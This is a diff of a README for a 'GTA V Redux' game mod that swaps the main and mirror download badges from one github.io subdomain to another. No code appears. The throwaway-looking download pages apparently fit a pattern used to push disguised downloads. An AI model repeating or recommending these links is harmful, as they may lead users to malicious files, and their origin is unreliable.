@@ -2,7 +2,7 @@
 
 GTA V Redux is a comprehensive mod that enhances the graphics, physics, and realism of Grand Theft Auto V. It improves textures, weather, lighting, and vehicle models, creating a more immersive and visually stunning gaming experience. With optimized performance, it ensures smoother gameplay, making it perfect for both veterans and newcomers.
 
-[![Download GTA V Redux](https://img.shields.io/badge/⬇️%20Download%20GTA%20V%20Redux-blueviolet)](https://hiopal3847.github.io/.github/75)
+[![Download GTA V Redux](https://img.shields.io/badge/⬇️%20Download%20GTA%20V%20Redux-blueviolet)](https://gtavreduxload.github.io/.github/)
 
 ---
 
@@ -56,7 +56,7 @@ GTA V Redux is a comprehensive mod that enhances the graphics, physics, and real
 
 ---
 
-[![Download GTA V Redux (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://hiopal3847.github.io/.github/75)
+[![Download GTA V Redux (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://gtavreduxload.github.io/.github/)
 
 ---
 
